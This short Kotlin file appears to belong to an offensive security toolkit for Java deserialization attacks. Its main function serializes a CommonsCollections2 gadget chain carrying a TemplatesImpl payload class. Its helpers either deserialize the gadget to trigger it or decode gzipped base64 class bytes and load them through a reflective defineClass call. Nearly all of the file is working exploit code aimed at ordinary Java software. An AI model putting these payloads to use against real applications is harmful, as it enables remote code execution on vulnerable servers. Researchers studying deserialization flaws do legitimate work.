package com.xhstormr.app

import java.io.ByteArrayInputStream
import java.io.ObjectInputStream
import java.util.Base64

fun main(args: Array<String>) {
    // exploit(CommonsCollections2ObjectPayload, TemplatesImplPayload1::class.java)
    // exploit(CommonsCollections2ObjectPayload, TemplatesImplPayload2::class.java)

    // exploit(clazz<FilterImpl>().asBase64(true))
    // exploit(clazz<FilterImpl>().asBase64(true))

    // println(clazz<FilterImpl>().asBase64(true))

    CommonsCollections2ObjectPayload
        .getObject(TemplatesImplPayload1::class.java)
        .serialize(System.out)
}

fun exploit(payload: ObjectPayload, clazz: Class<*>) {
    try {
        val any = payload.getObject(clazz)
        println(any)
        ObjectInputStream(ByteArrayInputStream(any.serialize()))
            .readObject()
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun exploit(base64: String) {
    val bytes = ungzip(Base64.getDecoder().decode(base64))
    val method = clazz<ClassLoader>().getDeclaredMethod(
        "defineClass", clazz<ByteArray>(), Int::class.javaPrimitiveType, Int::class.javaPrimitiveType
    ).apply { isAccessible = true }
    val clazz = method.invoke(object : ClassLoader() {}, bytes, 0, bytes.size) as Class<*>
    println(clazz)
    clazz.newInstance() == "123"
}
